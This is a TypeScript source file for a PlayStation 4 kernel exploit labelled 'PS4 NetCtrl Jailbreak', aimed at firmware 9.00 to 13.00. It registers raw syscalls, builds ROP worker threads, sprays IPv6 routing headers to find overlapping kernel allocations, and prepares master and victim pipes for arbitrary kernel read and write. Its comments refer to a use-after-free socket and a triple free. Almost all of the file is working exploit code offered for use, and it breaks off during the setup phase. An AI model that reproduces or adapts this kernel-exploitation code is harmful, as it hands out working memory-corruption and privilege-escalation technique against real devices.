import { fn, syscalls, BigInt, utils, gadgets } from 'download0/types'
import { libc_addr } from 'download0/userland'
import { get_fwversion, hex, malloc, read16, read32, read64, send_notification, write16, write32, write64, write8, get_kernel_offset, kernel, jailbreak_shared, read8 } from 'download0/kernel'
import { show_success, run_binloader } from 'download0/loader'

// include('userland.js')
include('kernel.js')

if (!String.prototype.padStart) {
  String.prototype.padStart = function padStart (targetLength, padString) {
    targetLength = targetLength >> 0 // truncate if number or convert non-number to 0
    padString = String(typeof padString !== 'undefined' ? padString : ' ')
    if (this.length > targetLength) {
      return String(this)
    } else {
      targetLength = targetLength - this.length
      if (targetLength > padString.length) {
        padString += padString.repeat(targetLength / padString.length) // append to original to ensure we are longer than needed
      }
      return padString.slice(0, targetLength) + String(this)
    }
  }
}

fn.register(0x29, 'dup', ['bigint'], 'bigint')
const dup = fn.dup
fn.register(0x06, 'close', ['bigint'], 'bigint')
const close = fn.close
fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint')
const read = fn.read
fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint')
const write = fn.write
fn.register(0x36, 'ioctl', ['bigint', 'number', 'bigint'], 'bigint')
const ioctl = fn.ioctl
fn.register(0x2A, 'pipe', ['bigint'], 'bigint')
const pipe = fn.pipe
fn.register(0x16A, 'kqueue', [], 'bigint')
const kqueue = fn.kqueue
fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint')
const socket = fn.socket
fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint')
const socketpair = fn.socketpair
fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint')
const getsockopt = fn.getsockopt
fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint')
const setsockopt = fn.setsockopt
fn.register(0x17, 'setuid', ['number'], 'bigint')
const setuid = fn.setuid
fn.register(20, 'getpid', [], 'bigint')
const getpid = fn.getpid
fn.register(0x14B, 'sched_yield', [], 'bigint')
const sched_yield = fn.sched_yield
fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint')
const cpuset_getaffinity = fn.cpuset_getaffinity
fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint')
const cpuset_setaffinity = fn.cpuset_setaffinity
fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint')
const rtprio_thread = fn.rtprio_thread
fn.register(0x63, 'netcontrol', ['bigint', 'number', 'bigint', 'number'], 'bigint')
const netcontrol = fn.netcontrol
fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint')
const thr_new = fn.thr_new
fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint')
const thr_kill = fn.thr_kill
fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint')
const nanosleep = fn.nanosleep
fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint')
const fcntl = fn.fcntl

// Extract syscall wrapper addresses for ROP chains from syscalls.map
const read_wrapper = syscalls.map.get(0x03)!
const write_wrapper = syscalls.map.get(0x04)!
const sched_yield_wrapper = syscalls.map.get(0x14b)!
const cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8)!
const rtprio_thread_wrapper = syscalls.map.get(0x1D2)!
const recvmsg_wrapper = syscalls.map.get(0x1B)!
const readv_wrapper = syscalls.map.get(0x78)!
const writev_wrapper = syscalls.map.get(0x79)!
const thr_exit_wrapper = syscalls.map.get(0x1af)!
const thr_suspend_ucontext_wrapper = syscalls.map.get(0x278)!
const setsockopt_wrapper = syscalls.map.get(0x69)!
const getsockopt_wrapper = syscalls.map.get(0x76)!

fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint')
const setjmp = fn.setjmp
const setjmp_addr = libc_addr.add(0x6CA00)
const longjmp_addr = libc_addr.add(0x6CA50)

const BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF)

const KERNEL_PID = 0

const SYSCORE_AUTHID = new BigInt(0x48000000, 0x00000007)

const FIOSETOWN = 0x8004667C

const PAGE_SIZE = 0x4000

const NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003
const NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007

const AF_UNIX = 1
const AF_INET6 = 28
const SOCK_STREAM = 1
const IPPROTO_IPV6 = 41

const SO_SNDBUF = 0x1001
const SOL_SOCKET = 0xffff

const IPV6_RTHDR = 51
const IPV6_RTHDR_TYPE_0 = 0

const RTP_PRIO_REALTIME = 2

const UIO_READ = 0
const UIO_WRITE = 1
const UIO_SYSSPACE = 1

const CPU_LEVEL_WHICH = 3
const CPU_WHICH_TID = 1

const IOV_SIZE = 0x10
const CPU_SET_SIZE = 0x10
const PIPEBUF_SIZE = 0x18
const MSG_HDR_SIZE = 0x30
const FILEDESCENT_SIZE = 0x8
const UCRED_SIZE = 0x168

const RTHDR_TAG = 0x13370000

const UIO_IOV_NUM = 0x14
const MSG_IOV_NUM = 0x17

// Params for kext stability
const IPV6_SOCK_NUM = 96
const IOV_THREAD_NUM = 8
const UIO_THREAD_NUM = 8
const MAIN_LOOP_ITERATIONS = 3
const TRIPLEFREE_ITERATIONS = 8
const KQUEUE_ITERATIONS = 5000

const MAX_ROUNDS_TWIN = 10
const MAX_ROUNDS_TRIPLET = 200

const MAIN_CORE = 7
const MAIN_RTPRIO = 0x100

const RTP_LOOKUP = 0
const RTP_SET = 1
const PRI_REALTIME = 2

const F_SETFL = 4
const O_NONBLOCK = 4

let FW_VERSION: string | null = null // Needs to be initialized to patch kernel

/***************************/
/*      Used constiables     */
/** *********************** */

const twins = new Array(2)
const triplets = new Array(3)
const ipv6_socks = new Array(IPV6_SOCK_NUM)

const spray_rthdr = malloc(UCRED_SIZE)
let spray_rthdr_len: number = -1
const leak_rthdr = malloc(UCRED_SIZE)

// Allocate buffer for ipv6_sockets magic spray
const spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE)
// Allocate buffer array for all socket data (X sockets × 8 bytes each)
const read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8)
const check_len = malloc(4)
// Initialize check_len to 8 bytes (done in JavaScript before ROP runs)

let fdt_ofiles: BigInt = new BigInt(0)
let master_r_pipe_file: BigInt = new BigInt(0)
let victim_r_pipe_file: BigInt = new BigInt(0)
let master_r_pipe_data: BigInt = new BigInt(0)
let victim_r_pipe_data: BigInt = new BigInt(0)

// Corrupt pipebuf of masterRpipeFd.
const master_pipe_buf = malloc(PIPEBUF_SIZE)

write32(check_len, 8)

const msg = malloc(MSG_HDR_SIZE)
const msgIov = malloc(MSG_IOV_NUM * IOV_SIZE)
const uioIovRead = malloc(UIO_IOV_NUM * IOV_SIZE)
const uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE)

const uio_sock = malloc(8)
const iov_sock = malloc(8)

const iov_thread_ready = malloc(8 * IOV_THREAD_NUM)
const iov_thread_done = malloc(8 * IOV_THREAD_NUM)
const iov_signal_buf = malloc(8 * IOV_THREAD_NUM)

const uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM)
const uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM)
const uio_readv_signal_buf = malloc(8 * IOV_THREAD_NUM)

const uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM)
const uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM)
const uio_writev_signal_buf = malloc(8 * IOV_THREAD_NUM)

const spray_ipv6_ready = malloc(8)
const spray_ipv6_done = malloc(8)
const spray_ipv6_signal_buf = malloc(8)
const spray_ipv6_stack = malloc(0x2000)

interface Worker {
  rop: BigInt[]
  loop_size: number
  pipe_0: number
  pipe_1: number
  ready: BigInt
  done: BigInt
  signal_buf: BigInt
  thread_id?: number
}

const iov_recvmsg_workers: Worker[] = []
const uio_readv_workers: Worker[] = []
const uio_writev_workers: Worker[] = []
let spray_ipv6_worker: Worker

let uaf_socket: number | undefined

let uio_sock_0: number
let uio_sock_1: number

let iov_sock_0: number
let iov_sock_1: number
const pipe_sock = malloc(8)
const master_pipe: [number, number] = [0, 0]
const victim_pipe: [number, number] = [0, 0]

let masterRpipeFd: number
let masterWpipeFd: number
let victimRpipeFd: number
let victimWpipeFd: number

let kq_fdp: BigInt
let kl_lock: BigInt

const tmp = malloc(PAGE_SIZE)

let saved_fpu_ctrl = 0
let saved_mxcsr = 0

function build_rthdr (buf: BigInt, size: number) {
  const len = ((size >> 3) - 1) & ~1
  const actual_size = (len + 1) << 3
  write8(buf.add(0x00), 0)                   // ip6r_nxt
  write8(buf.add(0x01), len)                 // ip6r_len
  write8(buf.add(0x02), IPV6_RTHDR_TYPE_0)   // ip6r_type
  write8(buf.add(0x03), (len >> 1))          // ip6r_segleft
  return actual_size
}

function set_sockopt (sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number) {
  const result = setsockopt(sd, level, optname, optval, optlen)
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('set_sockopt error: ' + hex(result))
  }
  return result
}

// Global buffer to minimize footprint
const sockopt_len_ptr = malloc(4)

const nanosleep_timespec = malloc(0x10)
const cpu_mask_buf = malloc(0x10)
const rtprio_scratch = malloc(0x4)
const sockopt_val_buf = malloc(4)
const nc_set_buf = malloc(8)
const nc_clear_buf = malloc(8)
const spawn_thr_args = malloc(0x80)
const spawn_tid = malloc(0x8)
const spawn_cpid = malloc(0x8)

function get_sockopt (sd: BigInt, level: number, optname: number, optval: BigInt, optlen: number) {
  // const len_ptr = malloc(4);
  write32(sockopt_len_ptr, optlen)
  const result = getsockopt(sd, level, optname, optval, sockopt_len_ptr)
  // debug("get_sockopt with sd: " + hex(sd) + " result: " + hex(result));
  if (result.eq(BigInt_Error)) {
    throw new Error('get_sockopt error: ' + hex(result))
    // debug("get_sockopt error: " + hex(result));
  }
  return read32(sockopt_len_ptr)
}

function set_rthdr (sd: BigInt, buf: BigInt, len: number) {
  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
  // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
  // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
  // return ret;
}

function get_rthdr (sd: BigInt, buf: BigInt, max_len: number) {
  return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len)
  // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
  // debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
  // return ret;
}

function free_rthdrs (sds: BigInt[]) {
  for (const sd of sds) {
    if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
      set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
    }
  }
}

function free_rthdr (sd: BigInt) {
  set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
}

function pin_to_core (core: number) {
  write32(cpu_mask_buf, 1 << core)
  cpuset_setaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf)
}

function get_core_index (mask_addr: BigInt) {
  let num = Number(read32(mask_addr))
  let position = 0
  while (num > 0) {
    num = num >>> 1
    position++
  }
  return position - 1
}

function get_current_core () {
  cpuset_getaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf)
  return get_core_index(cpu_mask_buf)
}

function set_rtprio (prio: number) {
  write16(rtprio_scratch, PRI_REALTIME)
  write16(rtprio_scratch.add(2), prio)
  rtprio_thread(RTP_SET, 0, rtprio_scratch)
}

function get_rtprio () {
  write16(rtprio_scratch, PRI_REALTIME)
  write16(rtprio_scratch.add(2), 0)
  rtprio_thread(RTP_LOOKUP, 0, rtprio_scratch)
  return Number(read16(rtprio_scratch.add(2)))
}

function create_workers () {
  const sock_buf = malloc(8)

  // Create workers
  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    const ready = iov_thread_ready.add(8 * i)
    const done = iov_thread_done.add(8 * i)
    const signal_buf = iov_signal_buf.add(8 * i)

    // Socket pair to signal "run"
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf)
    const pipe_0 = read32(sock_buf)
    const pipe_1 = read32(sock_buf.add(4))
    // debug("create pipe: " + pipe_0 + " " + pipe_1);

    const ret = iov_recvmsg_worker_rop(ready, new BigInt(pipe_0), done, signal_buf)

    const worker: Worker = {
      rop: ret.rop,
      loop_size: ret.loop_size,
      pipe_0,
      pipe_1,
      ready,
      done,
      signal_buf
    }
    iov_recvmsg_workers[i] = worker
  }

  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const ready = uio_readv_thread_ready.add(8 * i)
    const done = uio_readv_thread_done.add(8 * i)
    const signal_buf = uio_readv_signal_buf.add(8 * i)

    // Socket pair to signal "run"
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf)
    const pipe_0 = read32(sock_buf)
    const pipe_1 = read32(sock_buf.add(4))
    // debug("create pipe: " + pipe_0 + " " + pipe_1);

    const ret = uio_readv_worker_rop(ready, new BigInt(pipe_0), done, signal_buf)

    const worker = {
      rop: ret.rop,
      loop_size: ret.loop_size,
      pipe_0,
      pipe_1,
      ready,
      done,
      signal_buf
    }
    uio_readv_workers[i] = worker
  }

  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const ready = uio_writev_thread_ready.add(8 * i)
    const done = uio_writev_thread_done.add(8 * i)
    const signal_buf = uio_writev_signal_buf.add(8 * i)

    // Socket pair to signal "run"
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf)
    const pipe_0 = read32(sock_buf)
    const pipe_1 = read32(sock_buf.add(4))
    // debug("create pipe: " + pipe_0 + " " + pipe_1);

    const ret = uio_writev_worker_rop(ready, new BigInt(pipe_0), done, signal_buf)

    const worker = {
      rop: ret.rop,
      loop_size: ret.loop_size,
      pipe_0,
      pipe_1,
      ready,
      done,
      signal_buf
    }
    uio_writev_workers[i] = worker
  }

  // Create worker for spray and read magic in ipv6_sockets
  const ready = spray_ipv6_ready
  const done = spray_ipv6_done
  const signal_buf = spray_ipv6_signal_buf

  // Socket pair to signal "run"
  socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf)
  const pipe_0 = read32(sock_buf)
  const pipe_1 = read32(sock_buf.add(4))

  const ret = ipv6_sock_spray_and_read_rop(ready, new BigInt(pipe_0), done, signal_buf)

  const worker = {
    rop: ret.rop,
    loop_size: ret.loop_size,
    pipe_0,
    pipe_1,
    ready,
    done,
    signal_buf
  }

  spray_ipv6_worker = worker         // --> Worker data
}

function init_workers () {
  init_threading() // save needed info for longjmp

  let worker
  let ret

  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i]!
    ret = spawn_thread(worker.rop, worker.loop_size)
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn iov_recvmsg_workers[' + i + ']')
    }
    const thread_id = Number(ret.and(0xFFFFFFFF))               // Convert to 32bits value
    worker.thread_id = thread_id   // Save thread ID
  }

  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_readv_workers[i]!
    ret = spawn_thread(worker.rop, worker.loop_size)
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn uio_readv_workers[' + i + ']')
    }
    const thread_id = Number(ret.and(0xFFFFFFFF))               // Convert to 32bits value
    worker.thread_id = thread_id     // Save thread ID
  }

  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_writev_workers[i]!
    ret = spawn_thread(worker.rop, worker.loop_size)
    if (ret.eq(BigInt_Error)) {
      throw new Error('Could not spawn uio_writev_workers[' + i + ']')
    }
    const thread_id = Number(ret.and(0xFFFFFFFF))               // Convert to 32bits value
    worker.thread_id = thread_id    // Save thread ID
  }
}

function nanosleep_fun (nsec: number) {
  write64(nanosleep_timespec, Math.floor(nsec / 1e9))    // tv_sec
  write64(nanosleep_timespec.add(8), nsec % 1e9)         // tv_nsec
  nanosleep(nanosleep_timespec)
}

function wait_for (addr: BigInt, threshold: number) {
  while (!read64(addr).eq(threshold)) {
    nanosleep_fun(1)
  }
}

function trigger_iov_recvmsg () {
  let worker: Worker
  // Clear done signals
  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i]!
    write64(worker.done, 0)
    // debug("Worker done: " + hex(read64(worker.done)) );
  }

  // Send Init signal
  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i]!
    const ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + i + ']')
    }
  }
}

function wait_iov_recvmsg () {
  let worker: Worker
  // Wait for completition
  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    worker = iov_recvmsg_workers[i]!
    wait_for(worker.done, 1)
    // debug("Worker done: " + hex(read64(worker.done)) );
  }

  // debug("iov_recvmsg workers run OK");
}

function trigger_ipv6_spray_and_read () {
  // Worker information is already loaded

  // Clear done signals
  write64(spray_ipv6_worker.done, 0)

  // Spawn ipv6_sockets spray and read worker
  // Passing an stack addr reserved for each iteration
  let ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack)
  if (ret.eq(BigInt_Error)) {
    throw new Error('Could not spray_ipv6_worker')
  }
  const thread_id = Number(ret.and(0xFFFFFFFF))               // Convert to 32bits value
  spray_ipv6_worker.thread_id = thread_id        // Save thread ID

  // Send Init signal
  ret = write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1)
  if (ret.eq(BigInt_Error)) {
    throw new Error("Could not signal 'run' spray_ipv6_worker")
  }
}

function wait_ipv6_spray_and_read () {
  // Wait for completition
  wait_for(spray_ipv6_worker.done, 1)
}

function trigger_uio_readv () {
  let worker: Worker
  // Clear done signals
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_readv_workers[i]!
    write64(worker.done, 0)
    // debug("trigger_uio_readv done: " + hex(read64(worker.done)) );
  }

  // Send Init signal
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_readv_workers[i]!
    const ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + i + ']')
    }
  }
}

function wait_uio_readv () {
  let worker: Worker
  // Wait for completition
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_readv_workers[i]!
    wait_for(worker.done, 1)
  }
  // debug("Exit wait_uio_readv()");
}

function trigger_uio_writev () {
  let worker: Worker
  // Clear done signals
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_writev_workers[i]!
    write64(worker.done, 0)
    // debug("trigger_uio_writev done: " + hex(read64(worker.done)) );
  }

  // Send Init signal
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_writev_workers[i]!
    const ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
    if (ret.eq(BigInt_Error)) {
      throw new Error("Could not signal 'run' iov_recvmsg_workers[" + i + ']')
    }
  }
}

function wait_uio_writev () {
  let worker: Worker
  // Wait for completition
  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    worker = uio_writev_workers[i]!
    wait_for(worker.done, 1)
  }
  // debug("Exit wait_uio_writev()");
}

function init () {
  log('=== PS4 NetCtrl Jailbreak ===')

  FW_VERSION = get_fwversion()
  log('Detected PS4 firmware: ' + FW_VERSION)

  if (FW_VERSION === null) {
    log('Failed to detect PS4 firmware version.\nAborting...')
    send_notification('Failed to detect PS4 firmware version.\nAborting...')
    return false
  }

  const compare_version = (a: string, b: string) => {
    const a_arr = a.split('.')
    const amaj = Number(a_arr[0])
    const amin = Number(a_arr[1])
    const b_arr = b.split('.')
    const bmaj = Number(b_arr[0])
    const bmin = Number(b_arr[1])
    return amaj === bmaj ? amin - bmin : amaj - bmaj
  }

  if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.00') > 0) {
    log('Unsupported PS4 firmware\nSupported: 9.00-13.00\nAborting...')
    send_notification('Unsupported PS4 firmware\nAborting...')
    return false
  }

  kernel_offset = get_kernel_offset(FW_VERSION)
  log('Kernel offsets loaded for FW ' + FW_VERSION)

  return true
}

let prev_core: number = -1
let prev_rtprio: number = -1

function setup () {
  debug('Preparing netctrl...')

  prev_core = get_current_core()
  prev_rtprio = get_rtprio()
  pin_to_core(MAIN_CORE)
  set_rtprio(MAIN_RTPRIO)
  debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE)

  // Prepare spray buffer.
  spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE)
  // debug("this is spray_rthdr_len: " + hex(spray_rthdr_len));

  // Fill spray_rthdr_rop for ipv6_sockets spray
  for (let i = 0; i < IPV6_SOCK_NUM; i++) {
    build_rthdr(spray_rthdr_rop.add(i * UCRED_SIZE), UCRED_SIZE)
    // Prefill with tagged information
    write32(spray_rthdr_rop.add(i * UCRED_SIZE + 0x04), RTHDR_TAG | i)
  }

  // Prepare msg iov buffer.
  write64(msg.add(0x10), msgIov)      // msg_iov
  write64(msg.add(0x18), MSG_IOV_NUM) // msg_iovlen

  const dummyBuffer = malloc(0x1000)
  fill_buffer_64(dummyBuffer, new BigInt(0x41414141, 0x41414141), 0x1000)

  write64(uioIovRead.add(0x00), dummyBuffer)
  write64(uioIovWrite.add(0x00), dummyBuffer)

  // Create socket pair for uio spraying.
  socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock)
  uio_sock_0 = read32(uio_sock)
  uio_sock_1 = read32(uio_sock.add(4))

  // Create socket pair for iov spraying.
  socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock)
  iov_sock_0 = read32(iov_sock)
  iov_sock_1 = read32(iov_sock.add(4))

  // Set up sockets for spraying.
  for (let i = 0; i < ipv6_socks.length; i++) {
    ipv6_socks[i] = socket(AF_INET6, SOCK_STREAM, 0)
  }

  // Initialize pktopts.
  free_rthdrs(ipv6_socks)

  // Create pipes for arbitrary kernel r/w
  pipe(pipe_sock)
  master_pipe[0] = read32(pipe_sock)
  master_pipe[1] = read32(pipe_sock.add(4))

  pipe(pipe_sock)
  victim_pipe[0] = read32(pipe_sock)
  victim_pipe[1] = read32(pipe_sock.add(4))

  masterRpipeFd = master_pipe[0]
  masterWpipeFd = master_pipe[1]
  victimRpipeFd = victim_pipe[0]
  victimWpipeFd = victim_pipe[1]

  fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK)
  fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK)
  fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK)
  fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK)

  // Create and Init Thread Workers
  create_workers()

  init_workers()

  debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']')
}

function cleanup (kill_workers = false) {
  debug('Cleaning up...')

  // Close ipv6 sockets first (not blocking)
  for (let i = 0; i < ipv6_socks.length; i++) {
    close(ipv6_socks[i])
  }

  // Signal workers to unblock from read(), then kill them
  // Workers loop: read(pipe) -> work -> done -> repeat
  // We write to unblock, then kill before they loop back

  for (let i = 0; i < IOV_THREAD_NUM; i++) {
    const worker = iov_recvmsg_workers[i]
    if (worker !== undefined) {
      // Write to unblock from read()
      write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
      if (kill_workers && worker.thread_id !== undefined) {
        thr_kill(new BigInt(worker.thread_id), 9) // SIGKILL
      }
    }
  }

  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const worker = uio_readv_workers[i]
    if (worker !== undefined) {
      write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
      if (kill_workers && worker.thread_id !== undefined) {
        thr_kill(new BigInt(worker.thread_id), 9) // SIGKILL
      }
    }
  }

  for (let i = 0; i < UIO_THREAD_NUM; i++) {
    const worker = uio_writev_workers[i]
    if (worker !== undefined) {
      write(new BigInt(worker.pipe_1), worker.signal_buf, 1)
      if (kill_workers && worker.thread_id !== undefined) {
        thr_kill(new BigInt(worker.thread_id), 9) // SIGKILL
      }
    }
  }

  if (spray_ipv6_worker !== undefined) {
    write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1)
    if (kill_workers && spray_ipv6_worker.thread_id !== undefined) {
      thr_kill(new BigInt(spray_ipv6_worker.thread_id), 9) // SIGKILL
    }
  }

  // Now close the main sockets (workers are dead or unblocked)
  close(new BigInt(uio_sock_1))
  close(new BigInt(uio_sock_0))
  close(new BigInt(iov_sock_1))
  close(new BigInt(iov_sock_0))

  // Skip uaf_socket - hangs
  // if (uaf_socket !== undefined) {
  //   close(new BigInt(uaf_socket))
  // }

  if (prev_core >= 0) {
    debug('Restoring to previous core: ' + prev_core)
    pin_to_core(prev_core)
    prev_core = -1
  }

  set_rtprio(prev_rtprio)

  debug('Cleanup completed')
}

function fill_buffer_64 (buf: BigInt, val: BigInt, len: number) {
  for (let i = 0; i < len; i = i + 8) {
    write64(buf.add(i), val)
  }
}

function find_twins () {
  let count = 0
  let val
  let i
  let j

  // Minimizing the usage of BigInt class
  const spray_add = spray_rthdr.add(0x04)
  const lead_add = leak_rthdr.add(0x04)

  while (count < MAX_ROUNDS_TWIN) {
    if (count % 10 === 0) {
      // debug("find_twins iteration: " + count);
    }
    for (i = 0; i < ipv6_socks.length; i++) {
      write32(spray_add, RTHDR_TAG | i)
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len)

      // Using pre-filled buffer to spray
      // set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
      // setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
    }
    for (i = 0; i < ipv6_socks.length; i++) {
      get_rthdr(ipv6_socks[i], leak_rthdr, 8)
      val = read32(lead_add)
      j = val & 0xFFFF
      // I got 'i' socket routing header but find 'j' value
      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
        twins[0] = i
        twins[1] = j
        log('Twins found: [' + i + '] [' + j + ']')
        return true
      }
    }
    count++
  }
  log('find_twins failed')
  return false
  // cleanup();
  // throw new Error("find_twins failed");
}

function find_triplet (master: number, other: number, iterations?: number) {
  // debug("Enter find_triplet (" + master + ") (" + other + ")" );

  if (typeof iterations === 'undefined') {
    iterations = MAX_ROUNDS_TRIPLET
  }

  let count = 0
  let val
  let i
  let j

  // Minimizing the usage of BigInt class
  const spray_add = spray_rthdr.add(0x04)
  const leak_add = leak_rthdr.add(0x04)

  while (count < iterations) {
    if (count % 100 === 0) {
      // debug("find_triplet iteration: " + count);
    }
    for (i = 0; i < ipv6_socks.length; i++) {
      if (i === master || i === other) {
        continue
      }

      write32(spray_add, RTHDR_TAG | i)
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len)

      // Using pre-filled buffer to spray
      // set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
      // setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
    }

    // for (i = 0; i < ipv6_socks.length; i++) {
    //    if (i === master || i === other) {
    //        continue;
    //    }
    get_rthdr(ipv6_socks[master], leak_rthdr, 8)
    val = read32(leak_add)
    j = val & 0xFFFF
    if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
      // debug("Triplet found: [" + j + "] at iteration " + count);
      return j
    }
    // }
    count++
  }
  return -1
  // cleanup();
  // throw new Error("find_triplet failed");
}

function init_threading () {
  const jmpbuf = malloc(0x60)
  setjmp(jmpbuf)
  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)))
  saved_mxcsr = Number(read32(jmpbuf.add(0x44)))
}

const LOG_MAX_LINES = 38
const LOG_COLORS = [
  '#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F',
  '#4DABF7', '#9775FA', '#DA77F2'
]

function setup_log_screen () {
  jsmaf.root.children.length = 0

  const bg = new Image({
    url: 'file:///../download0/img/multiview_bg_VAF.png',
    x: 0,
    y: 0,
    width: 1920,
    height: 1080
  })
  jsmaf.root.children.push(bg)

  for (let i = 0; i < LOG_COLORS.length; i++) {
    new Style({ name: 'log' + i, color: LOG_COLORS[i]!, size: 20 })
  }

  const logLines: jsmaf.Text[] = []
  const logBuf: string[] = []

  for (let i = 0; i < LOG_MAX_LINES; i++) {
    const line = new jsmaf.Text()
    line.text = ''
    line.style = 'log' + (i % LOG_COLORS.length)
    line.x = 20
    line.y = 120 + i * 20
    jsmaf.root.children.push(line)
    logLines.push(line)
  }

  _log = function (msg: string, screen: boolean) {
    if (screen) {
      logBuf.push(msg)
      if (logBuf.length > LOG_MAX_LINES) logBuf.shift()
      for (let i = 0; i < LOG_MAX_LINES; i++) {
        logLines[i]!.text = i < logBuf.length ? logBuf[i]! : ''
      }
    }
    ws.broadcast(msg)
  }
}

function yield_to_render (callback: () => void) {
  const id = jsmaf.setInterval(function () {
    jsmaf.clearInterval(id)
    try {
      callback()
    } catch (e) {
      log('ERROR: ' + (e as Error).message)
      cleanup()
    }
  }, 0)
}

let exploit_count = 0
let exploit_end = false

function netctrl_exploit () {
  setup_log_screen()

  const supported_fw = init()
  if (!supported_fw) {
    return
  }

  log('Setting up exploit...')
  yield_to_render(exploit_phase_setup)
}

function exploit_phase_setup () {
  setup()
  log('Workers spawned')
